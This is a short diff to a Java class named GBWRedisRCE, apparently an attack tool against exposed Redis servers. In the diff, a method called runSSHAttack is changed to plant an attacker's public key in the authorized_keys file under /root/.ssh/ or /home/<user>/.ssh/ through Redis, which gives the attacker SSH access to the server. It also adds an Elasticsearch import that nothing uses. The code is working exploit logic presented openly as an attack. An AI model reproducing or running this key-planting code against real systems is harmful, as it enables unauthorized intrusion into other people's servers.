@@ -5,6 +5,7 @@ import org.apache.commons.cli.CommandLine;
 import org.apache.commons.cli.GnuParser;
 import org.apache.commons.cli.HelpFormatter;
 import org.apache.commons.cli.Options;
+import org.elasticsearch.cluster.routing.DelayedAllocationService;
 import org.elasticsearch.common.Strings;
 import redis.clients.jedis.Jedis;
 
@@ -212,10 +213,16 @@ public class GBWRedisRCE {
         return runSSHAttack(jedis,user,content);
     }
 
-    public static String runSSHAttack(Jedis jedis,String user,String content) throws IOException
+    public static String runSSHAttack(Jedis jedis,String user,String pubkey) throws IOException
     {
         String auth = "authorized_keys";
-        String authPath = String.format("%s/.ssh/",user);
+        String authPath = "/root/.ssh/";
+
+        String content = String.format("\n%s\n",pubkey);
+
+        if(!user.equals("root"))
+            authPath = String.format("/home/%s/.ssh/",user);
+
         StringBuffer sb = new StringBuffer();
         sb.append(String.format("Try to write public key to redis server:%s------------\n",authPath));
         try {
